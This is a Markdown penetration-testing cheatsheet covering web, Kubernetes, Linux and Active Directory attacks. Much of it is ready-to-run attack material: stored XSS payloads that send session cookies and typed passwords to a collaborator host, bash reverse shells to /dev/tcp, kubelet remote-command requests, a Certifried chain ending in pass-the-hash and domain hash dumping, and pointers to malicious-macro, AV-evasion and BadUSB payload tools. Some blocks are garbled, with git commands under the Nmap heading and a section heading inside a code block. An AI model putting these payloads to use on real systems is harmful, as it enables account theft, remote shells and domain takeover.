# pen-test-cheatsheet
## Scanning/Enumeration
### Tools
- Nmap 
- Nikto
- Dirbuster
- Dirb
- Gobuster

### Nmap
```
git status
git add
git commit
```
### Fingerprinting

A very handy tool is Wappalyzer browser extension for a basic technology fingerprint. Then one can use [whatweb](https://github.com/urbanadventurer/WhatWeb).
```
./whatweb reddit.com
```
### Request manipulation 
In order to view all requests being made one can use Burp suite or view them directly from the browser with pressing
<kbd>F12</kbd> -> Network tab + <kbd>Shift</kbd> + <kbd>CTRL</kbd> + <kbd>R</kbd> 
### Gobuster

#### Directory enumeration
```
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -e -t 10
```
#### DNS subdomain enumeration
```
gobuster dns -d <domain_name> -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 20
```
#### LDAP 
Find public information about the ldap server:
```
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
## WEB
### Flask
If a flask application is tested there are some flask-specific things we should consider. In some flask installations the debug mode is left enabled and can be accessed at /console, which might enable RCE. Also, if tokens are used, flash-unsign can be used as described in [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) to decode, bruteforce the secret key or forge a token. 

For a flask application directory listing, a specially crafted wordlist can be found [here](https://blog.r0b.re/assets/flask-wordlist.txt).
### Wordpress

- Run wpscan to gain basic information on the website.

- Check for installed plugins, themes and default pages.

- By default, the route /wp-json/wp/v2/user can list users. 

- Try bruteforcing the login page and see if lockout policy is implemented, if DoS is prevented via blocking or connection throttling. To test the lockout, try 100+ passwords and then try to login.

- Check all possible input fields around the page for client-side vulnerabilities (ex. XSS, CSRF)

- Check if XML-RPC is enabled. Issuing a POST request to /xmlrpc.php with the following payload should return all available methods (if enabled):
```
  <?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
    </param>
  </params>
</methodCall>
```
If enabled various attacks can be tested, Pingback, code injection, bruteforce etc.

### CSRF

If csrf token is present:
- Change method of request from POST to GET
- Try removing the csrf token from request completely
- Check if csrf token is tied to user session. Check if a csrf token of a logged in user will be accepted when the request is made by another user. 

### XSS

#### Reflected XSS

- Bypassing filters - When tags are filtered, use Burp to enumerate custom tags that pass the check. Use this custom tag with an onfocus event or an available event with a certain id, ex. id=’x’ and the code #x in the end of the command in order focus on this element as soon as the page is loaded.

#### Stored XSS

- Getting the session cookie of a user
```
<script> 
fetch('https://727hmmjs30bdhtmvi7l0ww5m8de42vqk.oastify.com', 
{ method: 'POST', 
mode: 'no-cors', 
body:document.cookie }); 
</script>
```

- Getting the user’s username and password
```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
- Forcing the user to issue a change mail request with a csrf token embedded
```
<script> var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() 
	{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; 
#### Resources 
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- https://github.com/rm-onata/xmlrpc-attack
```
#### Payload lists
- https://github.com/payloadbox/xss-payload-list

### Kubernetes

Kubernetes dashboard is available at:
```
https://<IP>:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```
An interesting directory to look at, especially if anonymous authentication is not enabled is the following:
```
https://<IP>:10250/runningpods/
```
which lists all running pods and information about them.

In order to check for RCE inside pods, one  can try to issue the following request:
```
curl -k -XPOST "https://<IP>:10250/run/<namespace>/<pod>/<container>" -d “cmd=<command>"
```
In order to interact with the Kubernetes kubelet there is a tool called [Kubeletctl](https://github.com/cyberark/kubeletctl). By issuing the following command one can execute commands into a pod.
```
kubeletctl -s <IP> exec "/bin/bash" -p nginx -c nginx
```
Interesting file locations inside a kubernetes pod:
- The locations of the ServiceAccount object, which is managed by Kubernets and provides identity within the pod
```
    /run/secrets/kubernetes.io/serviceaccount
    /var/run/secrets/kubernetes.io/serviceaccount
    /secrets/kubernetes.io/serviceaccout
```
With the kubectl one can interact with the kubernetes cluster. With the following command the capabilities of the specified user in the token can be listed:
```
kubectl auth can-i --list --token $(cat ./token) -s https://<IP>:8443 --certificate-authority ca.crt -n default
```
#### Resources:
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services
- https://medium.com/@noah_h/top-offensive-techniques-for-kubernetes-a71399d133b2
- https://www.trendmicro.com/en_ca/research/22/e/the-fault-in-our-kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html
- https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster
### Useful web tools
- [CyberChef](https://icyberchef.com) - A powerful encoder/decoder for most formats.
- [Cirt.net](https://cirt.net/passwords) - A comprehensive list of common/default password for vendor products and services.

## Shellcodes
- Upgrading to a fully interactive shell if python is installed:
```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
```
- One-liner fifo reverse shell of Linux
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```
- [Msfvenom cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [Reverse shell cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

## Priviledge escalation
### Windows
### Unix
To list a users's sudo privileges:
```
sudo -l
```
To check all suid binaries: 
```
find / -perm -4000 2>/dev/null
```
[GTFOBins](https://gtfobins.github.io/) - GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

The most comprehensive tool to detect priv esc paths in a linux system is by far [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), can be run directly in a terminal with:
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```


#### Suid binaries with known CVEs
- Pkexec - CVE 2021-4034([1](https://github.com/berdav/CVE-2021-4034), [2](https://github.com/ly4k/PwnKit))
## Persistency
### Windows
### Unix
- Copying ssh keys into the remote host by running:
  ```
  cat ~/.ssh/id_rsa.pub
  echo '<id_rsa.pub' > ~/.ssh/authorized_keys #or first run mkdir ~/.ssh if the directory does not exist
  ssh <username>@<host> -i id_rsa
  ```

## Password and hash cracking
### Bcrypt shadow file
```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```
## Bypassing AV & EDRs
### Tools
- [Shellter](https://www.shellterproject.com) - Dynamic shellcode injection tool aka dynamic PE infector
- [SigThief](https://github.com/secretsquirrel/SigThief) - Stealing Signatures and Making One Invalid Signature
- [MetaTwin](https://github.com/threatexpress/metatwin) - Cloning metadata and digital signature
- [CMiner](https://github.com/EgeBalci/Cminer) - Finding code caves in PEs
- CFF explorer - Viewing a file's details
## Reverse Engineering

To analyze a .jar file one can simply extract its contents as any regular zip file. In order to get clean code and function names it can be opened via [jd-gui](http://java-decompiler.github.io/), a very useful Java decompiler.

## Windows
## Active Directory
### Certifried - CVE-2022-26923
In order to check if the target is vulnerable: 

```
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
```
If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted.

To obtain information on the domain, such as domain controller, CA, the available templates and their capabilities run:
```
certipy find -u <username>@certifried.htb -p <password> -dc-ip <domain-controller-IP> 
```

The next step is to create a machine account specifying domain-controller in the -dns argument.
```
certipy account create -u '<username>' -p '<password>' -dc-ip  '<domain-controller-IP>' -user '<new-account-name>' -dns '<dc-domain-name>'
```

Once the account is successfully created, a certification request must be issued for the new account specifying the template as machine.
```
certipy req -dc-ip <domain-controller-IP> -u '<new-account-name>$' -p '<new-account-password' -ca <domain-CA> -template machine
```

After the certificate's issuance, it can be used to obtain the domain admin hash.
```
certipy auth -pfx dc.pfx -dc-ip <domain-controller-IP>
```

A pass-the-hash attack can be conducted in order to gain a shell into the Administrator using one of the following impacket tools.
```
impacket-psexec -hashes <obtained-hashes> Administrator@<domain-controller-IP>
impacket-smbexec -hashes <obtained-hashes> Administrator@<domain-controller-IP> (fileless)
```

Additionally in order to check all the hashes in the domain:
```
impacket-secretsdump <domain-name>/'dc$'@<domain-controller-IP>-hashes <obtained-hashes> -dc-ip <domain-controller-IP>
```
### MS Office Documents
#### Generating malicious macro-enabled documents
- [Boobsnail](https://github.com/STMCyber/boobsnail) - BoobSnail allows generating XLM (Excel 4.0) macro.
- [Evilclippy](https://github.com/outflanknl/EvilClippy) - A cross-platform assistant for creating malicious MS Office documents. Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro analysis tools.
- [Ivy](https://github.com/optiv/Ivy) - payload creation framework for the execution of arbitrary VBA (macro) source code in memory.
- [Hot-manchego](https://github.com/FortyNorthSecurity/hot-manchego) - Macro-Enabled Excel File Generator (.xlsm) using the EPPlus Library.

#### Sandbox evasion with VBA referencing 
##### Tools
- [Doctrack](https://github.com/wavvs/doctrack) - Inserting tracking pixel and remote template for template injection.
- intercepter.py - Custom python script to serve a tracking .png image, detect if code is running in a sandbox or user and serve a benign or malicious template.
##### Guides
- VBA Macro Remote Template Injection With Unlinking & Self-Deletion - https://medium.com/@john.woodman11/vba-macro-remote-template-injection-with-unlinking-self-deletion-49aef5eec0cd
- Sandbox Evasion using VBA referenencing - https://www.x33fcon.com/archive/2018/slides/x33fcon18_SandboxEvasionUsingVBAReferencing_ADori_AGrafi.pdf
- Remote template injection - https://blog.sunggwanchoi.com/remote-template-injection/
## HID USB
By having access to a DigiSpark Attiny85 USB one could use the board in order to emulate a keyboard and execute commands or payloads on the computer that the USB got connected. In order to upload the code to the board Arduino IDE can be used and the lirary Digispark AVR Boards should be installed. The Board must be set to Digispark (Default - 16.5mhz) and the Programmer to Micronucleous. After verifying the code,when clicking upload, the USB should be disconnected and plugged when prompted. 
> At the time of writing Digispark official website is not accessible, therefore the link used to install the library is this https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json.
### Guides and resources
- A complete guide on setting up the USB - https://macrosec.tech/index.php/2021/06/10/creating-bad-usb/
- A 3d model for printing a case - https://www.thingiverse.com/thing:6125087
- Payloads:
  	- https://github.com/MTK911/Attiny85
	- https://github.com/CedArctic/DigiSpark-Scripts

## Kiosk mode escape

When facing a device in public places or used for a very specific purpose there is the case that it is set up in kiosk mode. There are both Linux and Windows based kiosk configurations. First thing to do is to check if there is any kind of port available on the device. Secondly, both OS and browser shortcuts should be checked upon in order to escape the kiosk default front screen. Very useful resources are the following:
- [Escape-breakout](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/escape-breakout/)
- [Kiosk tooling](https://kiosk.vsim.xyz/)
